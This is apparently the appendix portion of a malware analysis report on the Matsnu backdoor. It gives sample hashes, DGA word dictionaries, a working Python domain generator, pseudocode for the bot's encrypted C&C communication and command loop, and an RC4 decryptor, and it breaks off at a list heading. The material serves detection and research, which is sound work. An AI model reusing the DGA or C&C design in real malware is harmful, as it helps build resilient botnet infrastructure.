Information\n\n```\n**Downloader:**\nResearched sample MD5: 68ee61498006d4eab636e2fab96de59c\nResearched sample SHA1: 82d0b65a4687ce3ad5b7a2bec7eb71eaf5c14371\n\n## Malware Family Names by Participating AVs (on the moment of scan)\n\n**Downloader:**\nSample detection by KAV: Backdoor.Win32.Androm.gkrf\nSample detection by AVG: Boxed.DQH\n\n\n-----\n\nSample detection by ClamAV: Sample detection by BitDefender: Trojan.GenericKD.2212311\n\n# Appendix A – DGA and dictionaries\n\n## Dictionary 1\n\n```\npeople\nhistory\nway\nart\nmoney\nworld\ninformation\nmap\ntwo\nfamily\ngovernment\nhealth\nsystem\ncomputer\nmeat\nyear\nthanks\nmusic\nperson\nreading\nmethod\ndata\nfood\nunderstanding\ntheory\nlaw\nbird\nliterature\nproblem\nsoftware\ncontrol\nknowledge\npower\nability\neconomics\nlove\ninternet\ntelevision\nscience\nlibrary\nnature\nfact\nproduct\nidea\ntemperature\ninvestment\narea\nsociety\nactivity\nstory\nindustry\n\n```\n```\nmedia\nthing\noven\ncommunity\ndefinition\nsafety\nquality\ndevelopment\nlanguage\nmanagement\nplayer\nvariety\nvideo\nweek\nsecurity\ncountry\nexam\nmovie\norganization\nequipment\nphysics\nanalysis\npolicy\nseries\nthought\nbasis\nboyfriend\ndirection\nstrategy\ntechnology\narmy\ncamera\nfreedom\npaper\nenvironment\nchild\ninstance\nmonth\ntruth\nmarketing\nuniversity\nwriting\narticle\ndepartment\ndifference\ngoal\nnews\naudience\nfishing\ngrowth\nincome\n\n```\n```\nmarriage\nuser\ncombination\nfailure\nmeaning\nmedicine\nphilosophy\nteacher\ncommunication\nrelation\nrestaurant\nsatisfaction\nsector\nsignature\nsignificance\nsong\ntooth\ntown\nvehicle\nvolume\nwife\naccident\nairport\nappointment\narrival\nassumption\nbaseball\nchapter\ncommittee\nconversation\ndatabase\nenthusiasm\nerror\nexplanation\nfarmer\ngate\ngirl\nhall\nhistorian\nhospital\ninjury\ninstruction\nmaintenance\nmanufacturer\nmeal\nperception\npie\npoem\npresence\nproposal\nreception\n\n```\n```\nreplacement\nrevolution\nriver\nson\nspeech\ntea\nvillage\nwarning\nwinner\nworker\nwriter\nassistance\nbreath\nbuyer\nchest\nchocolate\nconclusion\ncontribution\ncookie\ncourage\ndad\ndesk\ndrawer\nestablishment\nexamination\ngarbage\ngrocery\nhoney\nimpression\nimprovement\nindependence\ninsect\ninspection\ninspector\nking\nladder\nmenu\npenalty\npiano\npotato\nprofession\nprofessor\nquantity\nreaction\nrequirement\nsalad\nsister\nsupermarket\ntongue\nweakness\nwedding\n\n```\n\n-----\n\n```\naffair\nambition\nanalyst\napple\nassignment\nassistant\nbathroom\nbedroom\nbeer\nbirthday\ncelebration\nchampionship\ncheek\nclient\nconsequence\ndeparture\ndiamond\ndirt\near\nfortune\nfriendship\nfuneral\ngene\ngirlfriend\nhat\nindication\nintention\nlady\nmidnight\nnegotiation\nobligation\npassenger\npizza\nplatform\npoet\npollution\nrecognition\nreputation\nshirt\nsir\nspeaker\nstranger\nsurgery\nsympathy\ntale\nthroat\ntrainer\nuncle\nyouth\ntime\nwork\nfilm\nwater\nexample\nwhile\nbusiness\nstudy\ngame\n\n```\n```\nlife\nform\nair\nday\nplace\nnumber\npart\nfield\nfish\nback\nprocess\nheat\nhand\nexperience\njob\nbook\nend\npoint\ntype\nhome\neconomy\nvalue\nbody\nmarket\nguide\ninterest\nstate\nradio\ncourse\ncompany\nprice\nsize\ncard\nlist\nmind\ntrade\nline\ncare\ngroup\nrisk\nword\nfat\nforce\nkey\nlight\ntraining\nname\nschool\ntop\namount\nlevel\norder\npractice\nresearch\nsense\nservice\npiece\nweb\n\n```\n```\nboss\nsport\nfun\nhouse\npage\nterm\ntest\nanswer\nsound\nfocus\nmatter\nkind\nsoil\nboard\noil\npicture\naccess\ngarden\nrange\nrate\nreason\nfuture\nsite\ndemand\nexercise\nimage\ncase\ncause\ncoast\naction\nage\nbad\nboat\nrecord\nresult\nsection\nbuilding\nmouse\ncash\nclass\nnothing\nperiod\nplan\nstore\ntax\nside\nsubject\nspace\nrule\nstock\nweather\nchance\nfigure\nman\nmodel\nsource\nbeginning\nearth\n\n```\n```\nprogram\nchicken\ndesign\nfeature\nhead\nmaterial\npurpose\nquestion\nrock\nsalt\nact\nbirth\ncar\ndog\nobject\nscale\nsun\nnote\nprofit\nrent\nspeed\nstyle\nwar\nbank\ncraft\nhalf\ninside\noutside\nstandard\nbus\nexchange\neye\nfire\nposition\npressure\nstress\nadvantage\nbenefit\nbox\nframe\nissue\nstep\ncycle\nface\nitem\nmetal\npaint\nreview\nroom\nscreen\nstructure\nview\naccount\nball\ndiscipline\nmedium\nshare\nbalance\n\n```\n\n-----\n\n```\nbit\nblack\nbottom\nchoice\ngift\nimpact\nmachine\nshape\ntool\nwind\naddress\naverage\ncareer\nculture\nmorning\npot\nsign\ntable\ntask\ncondition\ncontact\ncredit\negg\nhope\nice\nnetwork\nnorth\nsquare\nattempt\ndate\neffect\nlink\npost\nstar\nvoice\ncapital\nchallenge\nfriend\nself\nshot\nbrush\ncouple\nexit\nfront\nfunction\nlack\nliving\nplant\nplastic\nspot\nsummer\ntaste\ntheme\ntrack\nwing\nbrain\nbutton\nclick\n\n```\n```\ndesire\nfoot\ngas\ninfluence\nmood\nnotice\nrain\nwall\nbase\ndamage\ndistance\nfeeling\npair\nsaving\nstaff\nsugar\ntarget\ntext\nanimal\nauthor\nbudget\ndiscount\nfile\nground\nlesson\nminute\nofficer\nphase\nreference\nregister\nsky\nstage\nstick\ntitle\ntrouble\nbowl\nbridge\ncampaign\ncharacter\nclub\nedge\nevidence\nfan\nletter\nlock\nmaximum\nnovel\noption\npack\npark\nplenty\nquarter\nskin\nsort\nweight\nbaby\nbackground\ncarry\n\n```\n```\ndish\nfactor\nfruit\nglass\njoint\nmaster\nmuscle\nred\nstrength\ntraffic\ntrip\nvegetable\nappeal\nchart\ngear\nideal\nkitchen\nland\nlog\nmother\nnet\nparty\nprinciple\nrelative\nsale\nseason\nsignal\nspirit\nstreet\ntree\nwave\nbelt\nbench\ncommission\ncopy\ndrop\nminimum\npath\nprogress\nproject\nsea\nsouth\nstatus\nstuff\nticket\ntour\nangle\nblue\nbreakfast\nconfidence\ndaughter\ndegree\ndoctor\ndot\ndream\nduty\nessay\nfather\n\n```\n```\nfee\nfinance\nhour\njuice\nluck\nmilk\nmouth\npeace\npipe\nstable\nstorm\nsubstance\nteam\ntrick\nafternoon\nbat\nbeach\nblank\ncatch\nchain\nconsideration\ncream\ncrew\ndetail\ngold\ninterview\nkid\nmark\nmission\npain\npleasure\nscore\nscrew\nsex\nshop\nshower\nsuit\ntone\nwindow\nagent\nband\nbath\nblock\nbone\ncalendar\ncandidate\ncap\ncoat\ncontest\ncorner\ncourt\ncup\ndistrict\ndoor\neast\nfinger\ngarage\nguarantee\n\n```\n\n-----\n\n```\nhole\nhook\nimplement\nlayer\nlecture\nlie\nmanner\nmeeting\nnose\nparking\npartner\nprofile\nrice\nroutine\nschedule\nswimming\ntelephone\ntip\nwinter\nairline\nbag\nbattle\nbed\nbill\nbother\ncake\ncode\ncurve\ndesigner\ndimension\ndress\nease\nemergency\nevening\nextension\nfarm\nfight\ngap\ngrade\nholiday\nhorror\nhorse\nhost\nhusband\nloan\nmistake\nmountain\nnail\nnoise\noccasion\npackage\npatient\npause\n\n```\n```\nphrase\nproof\nrace\nrelief\nsand\nsentence\nshoulder\nsmoke\nstomach\nstring\ntourist\ntowel\nvacation\nwest\nwheel\nwine\narm\naside\nassociate\nbet\nblow\nborder\nbranch\nbreast\nbrother\nbuddy\nbunch\nchip\ncoach\ncross\ndocument\ndraft\ndust\nexpert\nfloor\ngod\ngolf\nhabit\niron\njudge\nknife\nlandscape\nleague\nmail\nmess\nnative\nopening\nparent\npattern\npin\npool\npound\nrequest\n\n```\n```\nsalary\nshame\nshelter\nshoe\nsilver\ntackle\ntank\ntrust\nassist\nbake\nbar\nbell\nbike\nblame\nboy\nbrick\nchair\ncloset\nclue\ncollar\ncomment\nconference\ndevil\ndiet\nfear\nfuel\nglove\njacket\nlunch\nmonitor\nmortgage\nnurse\npace\npanic\npeak\nplane\nreward\nrow\nsandwich\nshock\nspite\nspray\nsurprise\ntill\ntransition\nweekend\nwelcome\nyard\nalarm\nbend\nbicycle\nbite\nblind\n\n```\n```\nbottle\ncable\ncandle\nclerk\ncloud\nconcert\ncounter\nflower\ngrandfather\nharm\nknee\nlawyer\nleather\nload\nmirror\nneck\npension\nplate\npurple\nruin\nship\nskirt\nslice\nsnow\nspecialist\nstroke\nswitch\ntrash\ntune\nzone\nanger\naward\nbid\nbitter\nboot\nbug\ncamp\ncandy\ncarpet\ncat\nchampion\nchannel\nclock\ncomfort\ncow\ncrack\nengineer\nentrance\nfault\ngrass\nguy\n\n```\n\n-----\n\n# Dictionary 2\n```\nis\nare\nhas\nget\nsee\nneed\nknow\nwould\nfind\ntake\nwant\ndoes\nlearn\nbecome\ncome\ninclude\nthank\nprovide\ncreate\nadd\nunderstand\nconsider\nchoose\ndevelop\nremember\ndetermine\ngrow\nallow\nsupply\nbring\nimprove\nmaintain\nbegin\nexist\ntend\nenjoy\nperform\ndecide\nidentify\ncontinue\nprotect\nrequire\noccur\nwrite\napproach\navoid\nprepare\nbuild\nachieve\nbelieve\nreceive\nseem\ndiscuss\nrealize\ncontain\n\n```\n```\nfollow\nrefer\nsolve\ndescribe\nprefer\nprevent\ndiscover\nensure\nexpect\ninvest\nreduce\nspeak\nappear\nexplain\nexplore\ninvolve\nlose\nafford\nagree\nhear\nremain\nrepresent\napply\nforget\nrecommend\nrely\nvary\ngenerate\nobtain\naccept\ncommunicate\ncomplain\ndepend\nenter\nhappen\nindicate\nsuggest\nsurvive\nappreciate\ncompare\nimagine\nmanage\ndiffer\nencourage\nexpand\nprove\nreact\nrecognize\nrelax\nreplace\nborrow\nearn\nemphasize\nenable\noperate\n\n```\n```\nreflect\nsend\nanticipate\nassume\nengage\nenhance\nexamine\ninstall\nparticipate\nintend\nintroduce\nrelate\nsettle\nsmell\nassure\nattract\ndistribute\novercome\nowe\nsucceed\nsuffer\nthrow\nacquire\nadapt\nadjust\nargue\narise\nconfirm\nencouraging\nincorporate\njustify\norganize\nought\npossess\nrelieve\nretain\nshut\ncalculate\ncompete\nconsult\ndeliver\nextend\ninvestigate\nnegotiate\nqualify\nretire\nrid\nweigh\narrive\nattach\nbehave\ncelebrate\nconvince\ndisagree\nestablish\n\n```\n```\nignore\nimply\ninsist\npursue\nremaining\nspecify\nwarn\naccuse\nadmire\nadmit\nadopt\nannounce\napologize\napprove\nattend\nbelong\ncommit\ncriticize\ndeserve\ndestroy\nhesitate\nillustrate\ninform\nmanufacturing\npersuade\npour\npropose\nremind\nshall\nsubmit\nsuppose\ntranslate\nbe\nhave\nuse\nmake\nlook\nhelp\ngo\nbeing\nthink\nread\nkeep\nstart\ngive\nplay\nfeel\nput\nset\nchange\nsay\ncut\nshow\ntry\ncheck\n\n```\n\n-----\n\n```\ncall\nmove\npay\nlet\nincrease\nturn\nask\nbuy\nguard\nhold\noffer\ntravel\ncook\ndance\nexcuse\nlive\npurchase\ndeal\nmean\nfall\nproduce\nsearch\nspend\ntalk\nupset\ntell\ncost\ndrive\nsupport\nremove\nreturn\nrun\nappropriate\nreserve\nleave\nreach\nrest\nserve\nwatch\ncharge\nbreak\nstay\nvisit\naffect\ncover\nreport\nrise\nwalk\npick\nlift\nmix\nstop\nteach\nconcern\nfly\nborn\ngain\nsave\n\n```\n```\nstand\nfail\nlead\nlisten\nworry\nexpress\nhandle\nmeet\nrelease\nsell\nfinish\npress\nride\nspread\nspring\nwait\ndisplay\nflow\nhit\nshoot\ntouch\ncancel\ncry\ndump\npush\nselect\nconflict\ndie\neat\nfill\njump\nkick\npass\npitch\ntreat\nabuse\nbeat\nburn\ndeposit\nprint\nraise\nsleep\nadvance\nconnect\nconsist\ncontribute\ndraw\nfix\nhire\njoin\nkill\nsit\ntap\nwin\nattack\nclaim\ndrag\ndrink\n\n```\n```\nguess\npull\nwear\nwonder\ncount\ndoubt\nfeed\nimpress\nrepeat\nseek\nsing\nslide\nstrip\nwish\ncollect\ncombine\ncommand\ndig\ndivide\nhang\nhunt\nmarch\nmention\nsurvey\ntie\nescape\nexpose\ngather\nhate\nrepair\nscratch\nstrike\nemploy\nhurt\nlaugh\nlay\nrespond\nsplit\nstrain\nstruggle\nswim\ntrain\nwash\nwaste\nconvert\ncrash\nfold\ngrab\nhide\nmiss\npermit\nquote\nrecover\nresolve\nroll\nsink\nslip\nsuspect\n\n```\n```\nswing\ntwist\nconcentrate\nestimate\nprompt\nrefuse\nregret\nreveal\nrush\nshake\nshift\nshine\nsteal\nsuck\nsurround\nbear\ndare\ndelay\nhurry\ninvite\nkiss\nmarry\npop\npray\npretend\npunch\nquit\nreply\nresist\nrip\nrub\nsmile\nspell\nstretch\ntear\nwake\nwrap\nwas\nlike\neven\nfilm\nwater\nbeen\nwell\nwere\nexample\nown\nstudy\nmust\nform\nair\nplace\nnumber\npart\nfield\nfish\nprocess\nheat\n\n```\n\n-----\n\n```\nhand\nexperience\njob\nbook\nend\npoint\ntype\nvalue\nbody\nmarket\nguide\ninterest\nstate\nradio\ncourse\ncompany\nprice\nsize\ncard\nlist\nmind\ntrade\nline\ncare\ngroup\nrisk\nword\nforce\nlight\nname\nschool\namount\norder\npractice\nresearch\nsense\nservice\npiece\nweb\nboss\nsport\npage\nterm\ntest\nanswer\nsound\nfocus\nmatter\nsoil\nboard\noil\npicture\naccess\ngarden\nopen\nrange\nrate\nreason\n\n```\n```\naccording\nsite\ndemand\nexercise\nimage\ncase\ncause\ncoast\nage\nboat\nrecord\nresult\nsection\nbuilding\nmouse\ncash\nclass\ndry\nplan\nstore\ntax\ninvolved\nside\nspace\nrule\nweather\nfigure\nman\nmodel\nsource\nearth\nprogram\ndesign\nfeature\npurpose\nquestion\nrock\nact\nbirth\ndog\nobject\nscale\nsun\nfit\nnote\nprofit\nrelated\nrent\nspeed\nstyle\nwar\nbank\ncontent\ncraft\nbus\nexchange\neye\nfire\n\n```\n```\nposition\npressure\nstress\nadvantage\nbenefit\nbox\ncomplete\nframe\nissue\nlimited\nstep\ncycle\nface\ninterested\nmetal\npaint\nreview\nroom\nscreen\nstructure\nview\naccount\nball\nconcerned\ndiscipline\nready\nshare\nbalance\nbit\nblack\nbottom\ngift\nimpact\nmachine\nshape\ntool\nwind\naddress\naverage\ncareer\nculture\npot\nsign\ntable\ntask\ncondition\ncontact\ncredit\negg\nhope\nice\nnetwork\nseparate\nattempt\ndate\neffect\nlink\nperfect\n\n```\n```\npost\nstar\nvoice\nchallenge\nfriend\nwarm\nbrush\ncouple\nexit\nexperienced\nfunction\nlack\nplant\nspot\nsummer\ntaste\ntheme\ntrack\nwing\nbrain\nbutton\nclick\ncorrect\ndesire\nfixed\nfoot\ngas\ninfluence\nnotice\nrain\nwall\nbase\ndamage\ndistance\npair\nstaff\nsugar\ntarget\ntext\nauthor\ncomplicated\ndiscount\nfile\nground\nlesson\nofficer\nphase\nreference\nregister\nsecure\nsky\nstage\nstick\ntitle\ntrouble\nadvanced\nbowl\nbridge\n\n```\n\n-----\n\n```\ncampaign\nclub\nedge\nevidence\nfan\nletter\nlock\noption\norganized\npack\npark\nquarter\nskin\nsort\nweight\nbaby\ncarry\ndish\nexact\nfactor\nfruit\nmuscle\ntraffic\ntrip\nappeal\nchart\ngear\nland\nlog\nlost\nnet\nseason\nspirit\ntree\nwave\nbelt\nbench\nclosed\ncommission\ncopy\ndrop\nfirm\nfrequent\nprogress\nproject\nstuff\nticket\ntour\nangle\nblue\nbreakfast\ndoctor\ndot\ndream\nessay\nfather\nfee\nfinance\n\n```\n```\njuice\nluck\nmilk\nmixed\nmouth\npipe\nplease\nstable\nstorm\nteam\namazing\nbat\nbeach\nblank\nbusy\ncatch\nchain\ncream\ncrew\ndetail\ndetailed\ninterview\nkid\nmark\npain\npleasure\nscore\nscrew\nsex\nsharp\nshop\nshower\nsuit\ntone\nwindow\nwise\nband\nbath\nblock\nbone\ncalendar\ncandidate\ncap\ncoat\ncontest\ncourt\ncup\ndistrict\nfinger\ngarage\nguarantee\nhole\nhook\nimplement\nlayer\nlecture\nlie\nmarried\n\n```\n```\nnarrow\nnose\npartner\nprofile\nrice\nschedule\ntelephone\ntip\nbag\nbattle\nbed\nbill\nbother\ncake\ncode\ncurve\ndimension\nease\nfarm\nfight\ngap\ngrade\nhorse\nhost\nhusband\nloan\nmistake\nnail\nnoise\noccasion\npackage\npause\nphrase\nrace\nsand\nsentence\nshoulder\nsmoke\nstomach\nstring\nsurprised\ntowel\nvacation\nwheel\narm\nassociate\nbet\nblow\nborder\nbranch\nbreast\nbuddy\nbunch\nchip\ncoach\ncross\ndocument\ndraft\n\n```\n```\ndust\nfloor\ngolf\nhabit\niron\njudge\nknife\nlandscape\nleague\nmail\nmess\nparent\npattern\npin\npool\npound\nrequest\nsalary\nshame\nshelter\nshoe\ntackle\ntank\ntrust\nassist\nbake\nbar\nbell\nbike\nblame\nbrick\nchair\ncloset\nclue\ncollar\ncomment\nconference\ndevil\ndiet\nfear\nfuel\nglove\njacket\nlunch\nmonitor\nmortgage\nnurse\npace\npanic\npeak\nprovided\nreward\nrow\nsandwich\nshock\nspite\nspray\nsurprise\n\n```\n\n-----\n\n```\ntill\ntransition\nweekend\nyard\nalarm\nbend\nbicycle\nbite\nblind\nbottle\ncable\ncandle\nclerk\ncloud\nconcert\ncounter\ndirty\nflower\ngrandfather\nharm\nknee\nlawyer\nload\n\n```\n```\nloose\nmirror\nneck\npension\nplate\npleased\nproposed\nruin\nship\nskirt\nslice\nsnow\nstroke\nswitch\ntired\ntrash\ntune\nworried\nzone\nanger\naward\nbid\nboot\n\n```\n```\nbug\ncamp\ncandy\ncarpet\ncat\nchampion\nchannel\nclock\ncomfort\ncow\ncrack\ndisappointed\nempty\nengineer\nentrance\nfault\ngrass\nguy\nhighlight\nisland\njoke\njury\nleg\n\n```\n```\nlip\nmate\nnerve\npassage\npen\npride\npriest\npromise\nresort\nring\nroof\nrope\nsail\nscheme\nscript\nslight\nsmart\nsock\nstation\ntoe\ntower\ntruck\nwitness\n\n```\n\n-----\n\n# DGA\n\n## Main Module (matsnu_dga.py)\n```\nimport sys\nimport datetime\nimport string\ndef is_hex(s):\n if not s.startswith('0x'):\n  return False\n s = s[2:]\n hex_digits = set(string.hexdigits)\n # if s is long, then it is faster to check against a set\n return all(c in hex_digits for c in s)\ndef is_valid_int(arg):\n if not is_hex(arg):\n  if not arg.isdigit():\n    return None\n  else:\n   value = int(arg)\n else:\n  value = int(arg, 16)\n return value\ndef parse_dict_file(fname):\n dict0 = []\n dict1 = []\n try:\n  with open(fname, 'rb') as f:\n   dict0 = f.read().split('\\n')\n    for i in range(len(dict0)):\n    dict0[i] = dict0[i].rstrip()\n     if dict0[i]:\n     dict1.append(dict0[i])\n except Exception as e:\n  print 'read error: ' + str(e)\n  sys.exit(1)\n return dict1\ndef write_file(fname, cont, separator = ''):\n try:\n  with open(fname, 'wb') as f:\n    for d in cont:\n    f.write(d + separator)\n except Exception as e:\n  print 'Write error: ' + str(e)\n  sys.exit(1)\ndef append_file(fname, cont, separator = ''):\n try:\n\n```\n\n-----\n\n```\nwith open(fname, 'a') as f:\n    for d in cont:\n    f.write(d + separator)\n except Exception as e:\n  print 'Write error: ' + str(e)\n  sys.exit(1)\nclass domain_generator:\n def __init__(self, dict1, dict2):\n  self.const1 = 0xef5eb\n  self.const2 = 0x39339\n  self.dict1 = dict1\n  self.dict2 = dict2\n def get_days_since_epoch(self):\n  epoch = datetime.datetime.utcfromtimestamp(0)\n  today = datetime.datetime.today()\n  d = today - epoch\n  return d.days\n def choose_next_word(self, dictionary):\n  self.seed &= 0xffff\n  self.seed = (self.seed * self.const1) & 0xffff\n  self.seed = (self.seed * self.time) & 0xffff\n  self.seed = (self.seed * self.const2) & 0xffff\n  self.seed = (self.seed * self.next_domain_no) & 0xffff\n  self.seed = (self.seed ^ self.const1) & 0xffff\n  rem = self.seed % len(dictionary)\n  return dictionary[self.seed % len(dictionary)]\n def generate_domain(self):\n  domain = ''\n  self.parity_flag = 0\n  while len(domain) < 0x18:\n    if len(domain) > 0xc:\n     break\n    if len(domain) == 0:\n    domain += self.choose_next_word(self.dict1)\n    elif self.parity_flag == 0:\n    domain += self.choose_next_word(self.dict1)\n    else:\n    domain += self.choose_next_word(self.dict2)\n   self.parity_flag = (self.parity_flag + 1) % 2\n    if self.seed & 0x1 == 0x1:\n    domain += '-'\n  if domain[-1] == '-':\n   domain = domain[:-1]\n  domain += '.com'\n  self.next_domain_no += 1\n  return domain\n\n```\n\n-----\n\n```\ndef generate_domains(self, loops, domains, time):\n  domains_list = []\n  # DGA works as follows: generate domains for the current and loops - 1 previous\ndays\n  time -= (loops - 1)\n  for l in range(loops):\n   self.seed = 1\n   self.next_domain_no = 1\n   self.time = time + l\n    for d in range(domains):\n    domains_list.append(self.generate_domain())\n  return domains_list\n\n## Domains generator\nimport sys\nimport matsnu_dga\nimport datetime\ndef unique_list(l):\n rl = []\n for e in l:\n  if e not in rl:\n   rl.append(e)\n return rl\ndef days_since_epoch(d):\n epoch = datetime.datetime.utcfromtimestamp(0)\n dse = d - epoch\n return dse.days\ndef domains_gen(date_from, date_to, dict1, dict2):\n dga = matsnu_dga.domain_generator(dict1, dict2)\n domains = []\n for d in range(date_from, date_to + 1):\n  dd = dga.generate_domains(3, 10, d)\n  domains += dd\n return domains\ndef main():\n if len(sys.argv) < 8:\n  print 'usage: ' + sys.argv[0] + '--from from-date --to to-date dict1 dict2 outfile [--unique-domains]'\n  sys.exit(1)\n dict1 = matsnu_dga.parse_dict_file(sys.argv[5])\n dict2 = matsnu_dga.parse_dict_file(sys.argv[6])\n\n```\n\n-----\n\n```\n if sys.argv[1] != '--from':\n  print 'Invalid arg: ' + sys.argv[1] + ', should be --from'\n  sys.exit(1)\n date_from = datetime.datetime.strptime(sys.argv[2], '%d.%m.%Y')\n days_from = days_since_epoch(date_from)\n if sys.argv[3] != '--to':\n  print 'Invalid arg: ' + sys.argv[3] + ', should be --to'\n  sys.exit(1)\n date_to = datetime.datetime.strptime(sys.argv[4], '%d.%m.%Y')\n days_to = days_since_epoch(date_to)\n if days_from > days_to:\n  print '--from date should be less equal than --to date'\n  return sys.exit(1)\n print '[+] Generating domains...'\n domains = domains_gen(days_from, days_to, dict1, dict2)\n print '[+] Domains were generated'\n if len(sys.argv) > 8:\n  if sys.argv[8] == '--unique-domains':\n    print '[+] Cleaning domains...'\n   domains = unique_list(domains)\n    print '[+] Domains were cleaned'\n dom_metadata = [ 'From: ' + sys.argv[2], 'To:' + sys.argv[4], 'DGA:' ]\n for d in domains:\n  dom_metadata.append(d)\n matsnu_dga.write_file(sys.argv[7], dom_metadata, '\\r\\n')\nif __name__ == '__main__':\n main()\n sys.exit(0)\n\n```\n\n-----\n\n# Appendix B –  Initial C&C server communication functions\n```\ndef init_cc_communication(base64_enc_sysinfo):\n AES_KEY = generate_alpha_key(rand(0x20, 0x40))\n GET_KEY = base64_encode(fill_cc_string('get=sysinfo'))\n query_par = get_resource_params_query()\n PACKET = 'GET='+GET_KEY+'&AES='+AES_KEY+'&sysinfo'=base64_enc_sysinfo\n crc32_packet = crc32(PACKET)\n enc_packet = RSA.encrypt(pub_key, 0x800, PACKET)\n enc_packet_base64 = base64_encode(enc_packet)\n enc_data_query_param = generate_alpha_key(rand(0x1, 0x3))\n enc_data_query_param += ('=' + enc_packet_base64)\n dns_response = dns_query_wrapper(query_par,enc_data_query_param,AES_KEY)\n return dns_response\ndef dns_query_wrapper(query_par, enc_data_query_param, aes):\n enc_data_len = len(enc_data_query_param)\n os.sleep(rand())\n mutex.acquire()\n dec_url = decrypt_data(domain_key, enc_domain, domain_len)\n mutex.release()\n ret_code = make_dns_query(dec_url)\n if ret_code == 0:\n  return None\n if not dec_url.finishwith('.php')\n  r = random.randint(0x3, 0x7)\n  query_param = generate_alpha_key(r)\n  dec_url += '/' + query_param + '.php'\n dec_url += query_par\n data = communicate_with_cc(dec_url,enc_data_query_param,enc_data_len)\n if data is None:\n  return None\n dec_data = decrypt_received_data(data, aes)\n if data is None:\n  return None\n cmd_code = packet_routine(dec_data)\n return cmd_code  \ndef make_dns_query(url):\n domain = get_domain_from_url(url)\n dns_response = dns_query(domain, dns_record)\n if dns_response == ERROR:\n  return 0\n dns_sinkhole = is_forbidden(dns_record) # sinkhole, DOMAINCOTROL and C&C server\nspecified\n if dns_sinkhole:\n  return 0\n return 1\ndef communicate_with_cc(url, enc_data_query_param, edqp_len):\n prot = check_protocol(url) # http, ftp, or https\n user_agent = 'Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; .NET CLR\n1.0.2914)'\n\n```\n\n-----\n\n```\n verb = 'POST'\n version = 'HTTP/1.0'\n headers = [ 'Content-Type: application/x-www-form-urlencoded' ]\n r=send_handler[prot](url,user_agent,verb,version,headers,\n            enc_data_query_param)\n return r \ndef decrypt_received_data(enc_data, aes):\n new_aes = aes + '6FFwof@fo1#049SfkxZ'\n left = len(enc_data)\n if left < 0x20:\n  return None\n aes_256_key = sha256(new_aes)\n packet_header = enc_data[:0x10]\n packet_cont = enc_data[0x10:]\n packet_cont = aes.decrypt(aes_256_key, packet_cont)\n for i in range(0x10):\n  packet_cont[i] ^= packet_header[i]\n return packet_cont\ndef packet_routine(decrypted_packet):\n found = decrypted_packet.find(':')\n packet = decrypted_packet[found + 1:]\n crc32_hdr = crc32(decrypted_packet[:found + 1])\n if crc32_hdr not in COMMANDS:\n  return\n data = packet_validate(crc32_hdr, packet)\n if data is None:\n  return None\n return data[1]\ndef packet_validate(hdr, cont):\n if len(cont) < 0x8:\n  return None\n cont_len = struct.unpack('<I', cont[:4])[0]\n crc32_sum = struct.unpack('>I', cont[4:8])[0]\n if len(cont[8:]) < cont_len:\n  return None\n if crc32_sum != crc32(cont[8:]):\n  return None\n return (cont[8:], CMD_CODE[hdr])\n\n# Appendix C –  Main communication loop\ndef epilog_routine(ret_code, code):\n if ret_code != WAIT:\n  send_idt_code_info()\n  if ret_code == UPGRADE and code == 0:\n\n```\n\n-----\n\n```\n   send_additional_info()\n  if ret_code == UPGRADEURL and code == 0:\n   send_additional_info()\ndef main_communication_loop():\n ret_code, packet_cont = get_response_from_cc()\n packet_len = len(packet_cont)\n if ret_code == WAIT:\n  error_code = 0x0\n  return\n if packet_cont is None:\n  code = 0x29a\n  epilog_routine(ret_code, code)\n  return\n data = packet_cont.split(':')\n if data is None:\n  code = 0x3e7\n  epilog_routine(ret_code, code)\n  return\n parsed_data = data[1]\n if len(data[0] + ':') > 0xB:\n  code = 0x3e6\n  epilog_routine(ret_code, code)\n  return\n packet_len -= len(parsed_data)\n ebp_18 = int(packet_cont)\n if ret_code == EXECUTE:\n  code = execute_code()\n elif ret_code == UPGRADE:\n  code = upgrade()\n elif ret_code == LOAD:\n  resp = communicate_with_cc()\n  if resp is None:\n   code = 0x14\n  else:\n   code = execute(resp)\n elif ret_code == UPGRADEURL:\n  resp = communicate_with_cc()\n  if resp is None:\n   code = 0x14\n  else:\n   code = upgrade(resp)\n epilog_routine(ret_code, code)\n\n```\n\n-----\n\n# Appendix D –  RC4 data decrypter\n```\nimport sys\nimport base64\nimport md5\ndef read_file(fname):\n try:\n  with open(fname, 'rb') as f:\n   cont = f.read()\n    return cont\n except Exception as e:\n  print 'Read error: ' + str(e)\n  sys.exit(1)\ndef write_file(fname, cont, separator = ''):\n try:\n  with open(fname, 'wb') as f:\n    for d in cont:\n    f.write(d + separator)\n except Exception as e:\n  print 'Write error: ' + str(e)\n  sys.exit(1)\nclass matsnu_decrypter:\n def __init__(self, key):\n  self.key = md5.new(key).digest()\n def decrypt(self, data):\n  return self.rc4crypt(data)\n def rc4crypt(self, data):\n  x = 0\n  box = range(256)\n  for i in range(256):\n   x = (x + box[i] + ord(self.key[i % len(self.key)])) % 256\n   box[i], box[x] = box[x], box[i]\n  x,y = 0, 0\n  out = []\n  for char in data:\n   x = (x + 1) % 256\n   y = (y + box[x]) % 256\n   box[x], box[y] = box[y], box[x]\n   out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))\n  return ''.join(out)\n def base64_str_decrypt(self, data, splitter = 0x0):\n  dec = []\n  base64_s = data.split(chr(splitter))\n  for s in base64_s:\n    dec.append(self.decrypt(base64.b64decode(s)))\n\n```\n\n-----\n\n```\nreturn dec\n def decrypt_chunk(self, data):\n  dec = self.decrypt(data)\n  return dec\nif __name__ == \"__main__\":\n if len(sys.argv) < 5:\n  print 'usage: ' + sys.argv[0] + ' type=<base64, plain> key-file enc-file outfile'\n  sys.exit(1)\n dec_type = sys.argv[1].rstrip()\n if dec_type != 'base64' and dec_type != 'plain':\n  print 'type: ' + dec_type + ' is invalid, use <base64, plain>'\n  sys.exit(1)\n cont = read_file(sys.argv[2]).rstrip()\n matsnu_dec = matsnu_decrypter(cont)\n cont = read_file(sys.argv[3])\n print '[+] Decrypting data...'\n if dec_type == 'base64':\n  dec = matsnu_dec.base64_str_decrypt(cont)\n  print '[+] Data decrypted'\n  write_file(sys.argv[4], dec, '\\r\\n')\n else:\n  dec = matsnu_dec.decrypt(cont)\n  print '[+] Data decrypted'\n  write_file(sys.argv[4], [dec])\n\n```\n\n-----\n\n# Appendix E –  Decrypted list of possibly infected 